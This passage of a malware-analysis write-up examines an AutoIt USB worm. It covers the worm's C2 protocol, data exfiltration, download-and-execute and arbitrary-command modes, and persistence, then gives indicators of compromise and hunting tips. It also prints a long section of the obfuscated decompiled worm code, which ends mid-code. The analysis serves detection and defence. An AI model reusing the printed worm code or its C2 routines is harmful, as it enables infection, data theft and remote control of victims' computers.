<pre><code>    $int_4 += 1\n    If $int_4 = 5 Then\n        $int_4 = 0\n        RunAutoItScript_SetPersistenceKeys_CreateStartupCommonLNK()\n        CreateDocuments_Downloads_LNK_CreateDir_Reports|Statements|My Pictures|My Videos|My Pictures|My Videos()\n    EndIf\n</code></pre> <p></p> <p>Then there is a <code>TCPRecv()</code> function call for receiving the command from the C2:</p> <pre><code>Func TCPRecv()\n    If $int_-1 &lt; 1 Then\n        $int_0 = 1\n        Return -1\n    EndIf\n    If @error Then\n    EndIf\n    $callTCPRecviver = TCPRecv($int_-1, 1024, 0)\n    If @error Then\n        $int_0 = 1\n        Return -1\n    EndIf\n    $string_\"\" &amp;= $callTCPRecviver\n\n    // Check if \"\\r\\n\" exists in the received message\n    If StringInStr($string_\"\", $string_\\r\\n) Then\n        $array_tcp_received = StringSplit($string_\"\", \"\\r\\n\")\n        $callTCPRecviver = $array_tcp_received[1]\n        $rn_position = StringInStr($string_\"\", $string_\\r\\n)\n        $rn_position += StringLen(String($string_\\r\\n))\n        $msgLength = StringLen($string_\"\")\n        $string_\"\" = StringMid($string_\"\", $rn_position, $msgLength - $rn_position)\n        Return $callTCPRecviver\n    EndIf\n    Return \"\"\nEndFunc\n</code></pre>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#c2-command-1-error-receiving-commands","title":"C2 Command 1: Error receiving commands","text":"<pre><code>        Case $messageReceivedFromTCPRecv = -1 OR $int_0 = 1\n            Sleep(3000)\n            C2CommandDef()\n            // C2 callback with \"lv|zeus|ComputerName|UserName||OSVersion OSArch|0.4x usb|AV_NAME|\"\n            C2Exfiltrate(\"lv0LIONW0zeus0LIONW0@ComputerName0LIONW0@UserName0LIONW0\"\"$string_0LIONW0@OSVersion @OSArch0LIONW00.4x0LIONW0 &amp; getAVNameFromWMI() &amp; $string_0LIONW0 &amp; \"\")\n</code></pre> <ul> <li>First the script process will sleep for 3000 ms</li> <li>The script will send the client information: <code>ComputerName</code>, <code>UserName</code>, <code>OSVersion</code>, <code>OSArch</code>, <code>AVName</code> to the C2</li> <li>Note the separator used <code>0LIONW0</code> - this again can be used as IDS signature</li> </ul> <p>Also note that the <code>AV_NAME</code> is obtained using WMI command:</p> <pre><code>Func getAVNameFromWMI()\n    Local $avname\n    If @OSVersion = \"WIN_XP\" Then\n        $owmi = ObjGet(\"winmgmts:\\\\localhost\\root\\SecurityCenter\")\n    Else\n        $owmi = ObjGet(\"winmgmts:\\\\localhost\\root\\SecurityCenter2\")\n    EndIf\n    $colitems = $owmi.execquery(\"Select * from AntiVirusProduct\")\n    For $objantivirusproduct In $colitems\n        $avname = $objantivirusproduct.displayname\n    Next\n    If $avname = False Then\n        Return \"No-AntiVirus\"\n    Else\n        Return $avname\n    EndIf\nEndFunc\n</code></pre> <p>Also note the C2 function:</p> <pre><code>Func C2CommandDef()\n    $int_0 = 0\n    TCPCloseSocket($int_-1)\n    If @error Then\n    EndIf\n    TCPShutdown()\n    If @error Then\n    EndIf\n    TCPStartup()\n    If @error Then\n    EndIf\n    $int_-1 = -1\n    // Connect to googleads.publicvm.com:223\n    $int_-1 = TCPConnect(TCPNameToIP(\"googleads.publicvm.com\"), 223)\n    If @error Then\n    EndIf\n    $int_0 = 0\nEndFunc\n</code></pre> <ul> <li>The C2 server is statically set to googleads.publicvm.com:223</li> <li>Should be no encryption</li> </ul> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#c2-command-2-received-null-from-c2","title":"C2 Command 2: Received \"null\" from C2","text":"<pre><code>        Case $messageReceivedFromTCPRecv = \"\"\n            $int_0 += 1\n            Sleep(1000)\n            If $int_0 = 8 Then\n                $int_0 = 0\n                // Get the full title of the current active window\n                $string_\"\"2 = WinGetTitle(\"\")\n                If $string_\"\"2 &lt;&gt; $string_\"\" Then\n                    // Exfiltrate the current Window name \"ac|ActiveWindowName\"\n                    C2Exfiltrate(\"ac0LIONW0 &amp; $string_\"\"2)\n                EndIf\n                $string_\"\" = $string_\"\"2\n                $string_\"\"2 = \"\"\n            EndIf\n</code></pre> <ul> <li>Get the full title of the current active window</li> </ul>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#c2-command-3-download-mode","title":"C2 Command 3: Download mode","text":"<p>The C2 may respond with an actual operational command and the current script will perform the corresponding action:</p> <pre><code>            $splitted_MsgTCPRecv_by_0LIONW0 = StringSplit($messageReceivedFromTCPRecv, \"0LIONW0\", 1)\n            If $splitted_MsgTCPRecv_by_0LIONW0[0] &gt; 0 Then\n                Select \n                    // [0: Action_Number - do something if &gt;0] 0LIONW0 [1: Action - DL] 0LIONW0 [2] 0LIONW0 [3]\n                    //  DL mode:   \" 1 | DL | Download_Source | Dest_FileName\"  --&gt; Download this file to %TEMP%\\FILENAME --&gt; Then use cmd.exe to execute\n</code></pre> <ul> <li>The script will extract the C2 operation command by splitting the respond payload with \"0LIONW0\".<ul> <li>1st portion: Have to be non-zero</li> <li>2nd portion: C2 operator - either <code>DL</code>, <code>un</code> or <code>cmd</code></li> </ul> </li> </ul> <pre><code>                    Case $splitted_MsgTCPRecv_by_0LIONW0[1] = \"DL\"\n                        InetGet($splitted_MsgTCPRecv_by_0LIONW0[2], @TempDir &amp; aString(\"\\\") &amp; $splitted_MsgTCPRecv_by_0LIONW0[3], 1)\n                        If FileExists(@TempDir &amp; aString(\"\\\") &amp; $splitted_MsgTCPRecv_by_0LIONW0[3]) Then\n                            ShellExecute(\"cmd.exe | /c start %temp%\\\" &amp; $splitted_MsgTCPRecv_by_0LIONW0[3], \"\", \"\", @SW_HIDE)\n                            C2Exfiltrate(\"MSG0LIONW0Executed As\" &amp; $splitted_MsgTCPRecv_by_0LIONW0[3])\n                        Else\n                            C2Exfiltrate(\"MSG0LIONW0Download ERR\")\n                        EndIf\n</code></pre> <p>The first mode will be the Download Mode (DL). A download URL and local destination filename will be provided in the C2 response. The script will extract them, download and execute the downloaded file in the <code>%TEMP%</code>. </p> <p>If successful, the script will send a message of <code>MSG0LIONW0Executed As &lt;FILENAME&gt;</code> to the C2 server. If not, it sends <code>MSG0LIONW0Download ERR</code>.</p> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#c2-command-4-un-mode","title":"C2 Command 4: un mode","text":"<p>This mode will try to revert persistence and firewall allow entry done by the script.</p> <pre><code>                    //  un mode: Uninstall the C2 and persistence components\n                    Case $splitted_MsgTCPRecv_by_0LIONW0[1] = \"un\"\n                        Uninstall_undoPersistence_UnsetFirewall()\n</code></pre> <p>The function invoked:</p> <pre><code>Func Uninstall_undoPersistence_UnsetFirewall():\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"microsoftsecurity)\n    RegDelete(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver\")\n    RegDelete(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\")\n    RegDelete(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftOffice\")\n    RegDelete(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftOffice\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftCMD.lnk\")\n    RegDelete(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftCMD.lnk\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftSecurity.exe\")\n    RegDelete(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"MicrosoftSecurity.exe\")\n    ShellExecute(\"netsh\", \"firewall delete allowedprogram \"@AutoItExe\", \"\", \"\", @SW_HIDE)\n    ShellExecute(@ComSpec, \"/k ping 0 &amp; del \"@AutoItExe\" &amp; exit\", \"\", \"\", @SW_HIDE)\n    C2Exfiltrate(\"MSG0LIONW0 Uninstall !!\")\n    Exit\n</code></pre> <ul> <li>Also note the C2 callback <code>MSG0LIONW0 Uninstall !!</code>.</li> </ul> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#c2-command-5-cmd-mode","title":"C2 Command 5: cmd mode","text":"<pre><code>                    Case $splitted_MsgTCPRecv_by_0LIONW0[1] = \"cmd\"\n                        If ShellExecute(\"cmd.exe\", $splitted_MsgTCPRecv_by_0LIONW0[2], \"\", \"\", @SW_HIDE) = 1 Then\n                            C2Exfiltrate(\"MSG0LIONW0\" &amp; \"Executed cmd.exe\" &amp; $splitted_MsgTCPRecv_by_0LIONW0[2])\n                        Else\n                            C2Exfiltrate(\"MSG0LIONW0Execute ERR cmd.exe\" &amp; $splitted_MsgTCPRecv_by_0LIONW0[2])\n                        EndIf\n</code></pre> <ul> <li>This mode executed an arbitrary command provided by the C2 server</li> <li>If the execution is successful, the script returns a C2 message <code>MSG0LIONW0Executed cmd.exe &lt;CommandGiven&gt;</code>; if not, it returns a similar message with <code>ERR</code></li> </ul>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#indicators-of-compromise-ioc","title":"Indicators of Compromise (IOC)","text":"<p>Network indicators:</p> <ul> <li><code>googleads.publicvm.com:223</code></li> <li>Any TCP connection payloads with the keyword <code>0LIONW0</code> or <code>zeus</code><ul> <li>If exists, you may use the analyzed C2 operators to track what had been performed further</li> </ul> </li> </ul> <p>File indicators:</p> <ul> <li>The malicious AutoIt script <code>Microsoft.a3x</code>: <ul> <li>MD5: <code>36E63B8E86188B92252804C3DB2407F4</code></li> </ul> </li> <li>The existence of the directory or files: <ul> <li><code>C:\\Microsoft</code></li> <li><code>C:\\GoogleChrome\\GoogleChrome.a3x</code></li> <li><code>C:\\GoogleChrome\\GoogleChrome.exe</code></li> <li><code>C:\\GoogleChrome\\GoogleChrome.lnk</code></li> <li><code>C:\\GoogleChrome\\My Pictures.lnk</code></li> <li><code>C:\\GoogleChrome\\GoogleUpdate.lnk</code></li> <li><code>C:\\GoogleChrome\\My Music.lnk</code></li> <li><code>C:\\GoogleChrome\\WindowsUpdate.lnk</code></li> <li><code>C:\\GoogleChrome\\Mozilla.exe</code></li> <li><code>C:\\GoogleChrome\\Mozilla.vbs</code></li> <li><code>C:\\GoogleChrome\\Mozilla.vb</code></li> <li><code>C:\\MozillaFirefox\\GoogleChrome.a3x</code></li> <li><code>C:\\MozillaFirefox\\GoogleChrome.exe</code></li> <li><code>C:\\MozillaFirefox\\GoogleChrome.lnk</code></li> <li><code>C:\\MozillaFirefox\\My Pictures.lnk</code></li> <li><code>C:\\MozillaFirefox\\GoogleUpdate.lnk</code></li> <li><code>C:\\MozillaFirefox\\My Music.lnk</code></li> <li><code>C:\\MozillaFirefox\\WindowsUpdate.lnk</code></li> <li><code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Microsoft Security.lnk</code></li> </ul> </li> </ul> <p>Registry:</p> <ul> <li>\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"JavaUpdate\"</li> <li>\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"AdopeUpdate\"</li> <li>\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"NewJavaInstall\"</li> <li>\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"AdopeFlash\"</li> <li>\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"WindowsUpdate.lnk\"</li> <li>\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"WindowsUpdate.lnk\"</li> <li>\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"GoogleChrome.exe\"</li> <li>\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"GoogleChrome.exe\"</li> <li>\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Google Chrome\"</li> <li>\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Google Chrome\"  \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\" with a value contains \"MicrosoftCMD.lnk\"</li> <li>\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Office\" with a value contains \"MicrosoftUpdate.lnk\"</li> <li>\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\" with a value contains \"MicrosoftUpdate.lnk\"</li> <li>\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"HDAudio\" with a value contains \"MicrosoftSecurity.exe /AutoIt3ExecuteScript\"</li> <li>\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver\" with a value contains \"MicrosoftSecurity.exe /AutoIt3ExecuteScript\"</li> </ul> <p>Hunting:</p> <ol> <li>Look for history of AutoIt3 script execution with the keyword  argument <code>AutoIt3ExecuteScript</code> or <code>.a3x</code></li> <li>Look for firewall modification to allow <code>MicrosoftSecurity.exe</code> using <code>netsh</code></li> <li>Look for any network connection to tcp:223</li> <li>Look for suspicious WMI query <code>Select * from AntiVirusProduct</code> from uncommon program</li> <li>Look for any anti-virus alert related to <code>AutoIt</code></li> </ol> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#references","title":"References","text":"","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#decompiled-script","title":"Decompiled script","text":"<pre><code>Global $dcznysrlakdhbtfenvsppoltilqrjiifqrjqpmwwwxpoovwmcgzf = ChrW(108 - 5) &amp; ChrW(13 + 98) &amp; ChrW(157 - 46) &amp; \"g\" &amp; ChrW(108) &amp; ChrW(149 - 48) &amp; ChrW(11 + 86) &amp; String(\"d\") &amp; ChrW(115) &amp; ChrW(80 - 34) &amp; ChrW(25 + 87) &amp; \"u\" &amp; ChrW(98) &amp; ChrW(154 - 46) &amp; ChrW(38 + 67) &amp; ChrW(146 - 47) &amp; ChrW(16 + 102) &amp; String(\"m\") &amp; ChrW(67 - 21) &amp; \"c\" &amp; ChrW(111) &amp; ChrW(45 + 64)\nGlobal $arapqeencactbyqjiooaywsrywfooepbidezquajhjtwvwmqemdn = 223\nGlobal $tzgdyjrtaoyylzlxtqtoodspdwwakojbbbijxbbhdgkslvltlpxo = \"C\" &amp; ChrW(28 + 30) &amp; \"\\\" &amp; \"M\" &amp; ChrW(149 - 44) &amp; ChrW(111 - 12) &amp; \"r\" &amp; \"o\" &amp; \"s\" &amp; ChrW(111) &amp; \"f\" &amp; ChrW(6 + 110) &amp; ChrW(83) &amp; ChrW(101) &amp; ChrW(99) &amp; ChrW(128 - 11) &amp; \"r\" &amp; \"i\" &amp; ChrW(125 - 9) &amp; ChrW(121)\nGlobal $toypgraanpjlfwxjscarpmliszehlbquruimbscebztnxymoybci = ChrW(40 + 37) &amp; String(\"i\") &amp; ChrW(108 - 9) &amp; ChrW(114) &amp; \"o\" &amp; ChrW(115) &amp; String(\"o\") &amp; ChrW(121 - 19) &amp; \"t\" &amp; ChrW(101 - 34) &amp; ChrW(108 - 31) &amp; ChrW(68) &amp; ChrW(47 + -1) &amp; \"l\" &amp; String(\"n\") &amp; ChrW(2 + 105)\nGlobal $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan = String(\"M\") &amp; ChrW(16 + 89) &amp; ChrW(38 + 61) &amp; ChrW(32 + 82) &amp; ChrW(18 + 93) &amp; ChrW(8 + 107) &amp; ChrW(161 - 50) &amp; ChrW(102) &amp; String(\"t\")\nGlobal $vcjuqioffbuxjhmrijmlbucfcfhjjcrkovnvyluomdhvzuybwwat = String(\"M\") &amp; ChrW(12 + 93) &amp; ChrW(50 + 49) &amp; ChrW(114) &amp; ChrW(8 + 103) &amp; ChrW(115) &amp; \"o\" &amp; \"f\" &amp; ChrW(20 + 96) &amp; ChrW(32) &amp; ChrW(83) &amp; ChrW(101) &amp; String(\"c\") &amp; \"u\" &amp; ChrW(7 + 107) &amp; ChrW(26 + 79) &amp; ChrW(31 + 85) &amp; ChrW(6 + 115)\nGlobal $oolbadsjbfwdjkintqtwpzzxmffhgfnmbxvzjmvtsknhhelokmhf = ChrW(79 - 2) &amp; ChrW(27 + 78) &amp; ChrW(25 + 74) &amp; String(\"r\") &amp; ChrW(127 - 16) &amp; \"s\" &amp; ChrW(111) &amp; ChrW(29 + 73) &amp; ChrW(116) &amp; ChrW(83) &amp; ChrW(116 - 15) &amp; ChrW(99) &amp; ChrW(117) &amp; ChrW(136 - 22) &amp; ChrW(128 - 23) &amp; ChrW(145 - 29) &amp; ChrW(5 + 116) &amp; String(ChrW(47 + -1)) &amp; ChrW(101) &amp; \"x\" &amp; \"e\"\nGlobal $deepoootxldvrjbmoidhvydelsqitqvtyhjxsgluxbtihspxbzyd = 4\nGlobal $hakcazdwxfzioixjzetjxkktduwtdsgvrsmyxgwscpwrbmryvfyx = ChrW(48 + 70) &amp; \"b\" &amp; ChrW(115)\nLocal $fqfxoqyfdjreydrxvymtibggnsrscyxxuipampighposwrrxvucw = ChrW(138 - 48) &amp; ChrW(128 - 27) &amp; ChrW(145 - 28) &amp; ChrW(16 + 99)\n$fqfxoqyfdjreydrxvymtibggnsrscyxxuipampighposwrrxvucw &amp;= \"_\" &amp; Hex(DriveGetSerial(@HomeDrive))\nGlobal $tepdkyjxzgcfkvjqnqlgpfmrmmlwzswhwceqtlqoflhbljiagble = ChrW(67 - 19) &amp; ChrW(46) &amp; ChrW(63 - 11) &amp; ChrW(151 - 31)\nIf FileExists($tzgdyjrtaoyylzlxtqtoodspdwwakojbbbijxbbhdgkslvltlpxo &amp; ChrW(47) &amp; $pgyhdqwhnsqlzouknkgzzuppsxkumpjjyhflwbjmwusjiinjdcan &amp; ChrW(50 - 4) &amp; ChrW(139 - 31) &amp; ChrW(110) &amp; ChrW(107)) Then\n    $tepdkyjxzgcfkvjqnqlgpfmrmmlwzswhwceqtlqoflhbljiagble = ChrW(48) &amp; ChrW(46) &amp; String(\"4\") &amp; ChrW(120) &amp; ChrW(32) &amp; ChrW(85) &amp; ChrW(46 + 69) &amp; ChrW(31 + 67)\nEndIf\n$ivfnryrxlmwhjvjiruxaaxafykecdkqygsyawqyvstbsozrqazjk = ChrW(110 - 33) &amp; ChrW(17 + 88) &amp; ChrW(99) &amp; String(\"r\") &amp; ChrW(160 - 49) &amp; ChrW(115) &amp; String(\"o\") &amp; ChrW(116 - 14) &amp; ChrW(136 - 20) &amp; ChrW(1 + 45) &amp; String(\"a\") &amp; \"3\" &amp; ChrW(120)\n$ejeluzphspscvwarxilawchgwhrytnceafuxnnfxaqbeazwqzatr = 0\n$nipcbxpmhqnfnobrddekcozeadfwlaztuiqspsvpwsoldvrkyemu = ChrW(13) &amp; ChrW(10)\n$vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp = String(\"0\") &amp; ChrW(126 - 50) &amp; String(\"I\") &amp; ChrW(129 - 50) &amp; ChrW(78) &amp; \"W\" &amp; String(\"0\")\n$cbngwgavixmwtvsnxajiavvlpgrrtsuwgjbnponnpnwsjbmwpgkj = 0\n$ffohfcsqoibpdqpjtfxjmvtmybbouvcmikrautgmwxyflgpsmcci = -1\nIf @ScriptDir &lt;&gt; $tzgdyjrtaoyylzlxtqtoodspdwwakojbbbijxbbhdgkslvltlpxo AND $deepoootxldvrjbmoidhvydelsqitqvtyhjxsgluxbtihspxbzyd = 4 Then\n    If $hakcazdwxfzioixjzetjxkktduwtdsgvrsmyxgwscpwrbmryvfyx = ChrW(125 - 24) &amp; ChrW(15 + 105) &amp; String(\"e\") Then\n        FileCopy(@AutoItExe, $jbwklcjcaewtgpgszopzykmpwnarnhcrstdgofpsjelsafyvywtx, 9)\n        Run($jbwklcjcaewtgpgszopzykmpwnarnhcrstdgofpsjelsafyvywtx)\n    Else\n        DirCopy(@ScriptDir, $tzgdyjrtaoyylzlxtqtoodspdwwakojbbbijxbbhdgkslvltlpxo, 1)\n        ShellExecute($tzgdyjrtaoyylzlxtqtoodspdwwakojbbbijxbbhdgkslvltlpxo &amp; String(String(\"\\\")) &amp; ChrW(28 + 49) &amp; String(\"i\") &amp; ChrW(20 + 79) &amp; String(\"r\") &amp; ChrW(41 + 70) &amp; String(\"s\") &amp; ChrW(111) &amp; ChrW(140 - 38) &amp; ChrW(117 - 1) &amp; ChrW(83) &amp; \"e\" &amp; String(\"c\") &amp; \"u\" &amp; String(\"r\") &amp; ChrW(105) &amp; String(\"t\") &amp; ChrW(30 + 91) &amp; ChrW(47 + -1) &amp; ChrW(104 - 3) &amp; String(\"x\") &amp; ChrW(138 - 37), ChrW(57 - 10) &amp; String(\"A\") &amp; ChrW(167 - 50) &amp; ChrW(152 - 36) &amp; ChrW(16 + 95) &amp; ChrW(3 + 70) &amp; ChrW(124 - 8) &amp; String(\"3\") &amp; \"E\" &amp; \"x\" &amp; String(\"e\") &amp; ChrW(35 + 64) &amp; String(\"u\") &amp; ChrW(142 - 26) &amp; \"e\" &amp; ChrW(113 - 30) &amp; ChrW(17 + 82) &amp; ChrW(118 - 4) &amp; ChrW(142 - 37) &amp; \"p\" &amp; \"t\" &amp; String(ChrW(48 - 16)) &amp; $tzgdyjrtaoyylzlxtqtoodspdwwakojbbbijxbbhdgkslvltlpxo &amp; String(\"\\\") &amp; $ivfnryrxlmwhjvjiruxaaxafykecdkqygsyawqyvstbsozrqazjk, \"\", \"\", @SW_HIDE)\n        ShellExecute(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", String(\"/\") &amp; ChrW(147 - 48) &amp; ChrW(74 - 42) &amp; ChrW(19 + 96) &amp; ChrW(12 + 104) &amp; ChrW(19 + 78) &amp; String(\"r\") &amp; String(\"t\") &amp; ChrW(21 + 11) &amp; $tzgdyjrtaoyylzlxtqtoodspdwwakojbbbijxbbhdgkslvltlpxo &amp; ChrW(37 + 10) &amp; String(\"M\") &amp; ChrW(34 + 71) &amp; ChrW(139 - 40) &amp; ChrW(13 + 101) &amp; ChrW(111) &amp; String(\"s\") &amp; ChrW(150 - 39) &amp; \"f\" &amp; ChrW(14 + 102) &amp; String(\"S\") &amp; \"e\" &amp; String(\"c\") &amp; ChrW(117) &amp; ChrW(17 + 97) &amp; \"i\" &amp; ChrW(18 + 98) &amp; \"y\" &amp; ChrW(47 + -1) &amp; ChrW(150 - 49) &amp; String(\"x\") &amp; ChrW(11 + 90) &amp; ChrW(47 + -15) &amp; $tzgdyjrtaoyylzlxtqtoodspdwwakojbbbijxbbhdgkslvltlpxo &amp; ChrW(47) &amp; $ivfnryrxlmwhjvjiruxaaxafykecdkqygsyawqyvstbsozrqazjk, \"\", \"\", @SW_HIDE)\n    EndIf\n    FileSetAttrib($tzgdyjrtaoyylzlxtqtoodspdwwakojbbbijxbbhdgkslvltlpxo, ChrW(43) &amp; ChrW(111 - 29) &amp; ChrW(83) &amp; ChrW(13 + 59))\n    Exit\nEndIf\n$mdkyphoybroscebnlbesywpuytnrnesroeepieqgsrqsptqxdkkw = \"\"\n$rbypnqzvtwjxyxdxymfhjxzhgvdecqndtvznepbrfunuhstsqsyq = -1\nmnmurofuotaxronjkijvbjrqkrmevcwwmbsmjcmjzcqxplscwnzh()\npdopzmetzkuzbrqhzoeumbhwurckkvjpcugoopapsrcaphhetqfi()\nrblzbaqmbvoikeqerwerhbazuhagqctwscfbbxkckkhjwjxexbay()\nmrlkjwkdvkbssnhhsekfkmqktxuoqlzwcmwldaxjfksijngrvuuv(\"A\" &amp; ChrW(121 - 45) &amp; ChrW(43 + 33))\nlfvcwvjzbaxkwdlqvabiwzwzssazyiijcolgfponslgyfebnachv()\n$fdltbsjrmutdjfdbxosklncqkdzmbmoiswypifmmekekbjmbpqub = 4\n$ynfqbwixswozfjkmgouqcgebirpbrxxkqmkerinlwotiveeryavb = \"\"\n$xdztjehjhhgvzeitzfvyahtnmvednwcrbvnnnrvmbefqiyjrwkrs = \"\"\n$exbpklgnydwjfptcqufilhvvcdfomohcfjmeuwcbkhoyhuksefzc = ChrW(78 - 7) &amp; String(\"o\") &amp; \"o\" &amp; \"g\" &amp; \"l\" &amp; ChrW(131 - 30) &amp; String(\"C\") &amp; \"h\" &amp; \"r\" &amp; \"o\" &amp; ChrW(140 - 31) &amp; ChrW(150 - 49) &amp; ChrW(42 + 4) &amp; ChrW(101) &amp; String(\"x\") &amp; ChrW(109 - 8)\nSleep(@AutoItPID / 10)\nIf _singleton($exbpklgnydwjfptcqufilhvvcdfomohcfjmeuwcbkhoyhuksefzc, 1) = 0 Then\n    Exit\nEndIf\nWhile 1\n    $fdltbsjrmutdjfdbxosklncqkdzmbmoiswypifmmekekbjmbpqub += 1\n    If $fdltbsjrmutdjfdbxosklncqkdzmbmoiswypifmmekekbjmbpqub = 5 Then\n        $fdltbsjrmutdjfdbxosklncqkdzmbmoiswypifmmekekbjmbpqub = 0\n        pdopzmetzkuzbrqhzoeumbhwurckkvjpcugoopapsrcaphhetqfi()\n        lfvcwvjzbaxkwdlqvabiwzwzssazyiijcolgfponslgyfebnachv()\n    EndIf\n    If @error Then\n    EndIf\n    $ejhwafnhgrbjvudvcpjsrdxdsyogslkgoexwcpeojvwtgecnrpqp = vgmovrvjjuidbgwhmbqjnpauyhhmjxquqasvirrwuqfxizyilzss()\n    If @error Then\n    EndIf\n    Select \n        Case $ejhwafnhgrbjvudvcpjsrdxdsyogslkgoexwcpeojvwtgecnrpqp = -1 OR $ejeluzphspscvwarxilawchgwhrytnceafuxnnfxaqbeazwqzatr = 1\n            Sleep(3000)\n            axhehxxafrgmhqherstchiuehcfrjrmjdqigprnjmsljwafbkpcu()\n            yutherqpkizldomanazujuowkemziyaieyvuglsqadmmqsuumyvk(ChrW(108) &amp; \"v\" &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; $fqfxoqyfdjreydrxvymtibggnsrscyxxuipampighposwrrxvucw &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; @ComputerName &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; @UserName &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; \"\" &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; @OSVersion &amp; ChrW(48 - 16) &amp; @OSArch &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; $tepdkyjxzgcfkvjqnqlgpfmrmmlwzswhwceqtlqoflhbljiagble &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; av() &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; \"\")\n        Case $ejhwafnhgrbjvudvcpjsrdxdsyogslkgoexwcpeojvwtgecnrpqp = \"\"\n            $cbngwgavixmwtvsnxajiavvlpgrrtsuwgjbnponnpnwsjbmwpgkj += 1\n            Sleep(1000)\n            If $cbngwgavixmwtvsnxajiavvlpgrrtsuwgjbnponnpnwsjbmwpgkj = 8 Then\n                $cbngwgavixmwtvsnxajiavvlpgrrtsuwgjbnponnpnwsjbmwpgkj = 0\n                $xdztjehjhhgvzeitzfvyahtnmvednwcrbvnnnrvmbefqiyjrwkrs = WinGetTitle(\"\")\n                If $xdztjehjhhgvzeitzfvyahtnmvednwcrbvnnnrvmbefqiyjrwkrs &lt;&gt; $ynfqbwixswozfjkmgouqcgebirpbrxxkqmkerinlwotiveeryavb Then\n                    yutherqpkizldomanazujuowkemziyaieyvuglsqadmmqsuumyvk(\"a\" &amp; ChrW(99) &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; $xdztjehjhhgvzeitzfvyahtnmvednwcrbvnnnrvmbefqiyjrwkrs)\n                EndIf\n                $ynfqbwixswozfjkmgouqcgebirpbrxxkqmkerinlwotiveeryavb = $xdztjehjhhgvzeitzfvyahtnmvednwcrbvnnnrvmbefqiyjrwkrs\n                $xdztjehjhhgvzeitzfvyahtnmvednwcrbvnnnrvmbefqiyjrwkrs = \"\"\n            EndIf\n        Case $ejhwafnhgrbjvudvcpjsrdxdsyogslkgoexwcpeojvwtgecnrpqp &lt;&gt; \"\"\n            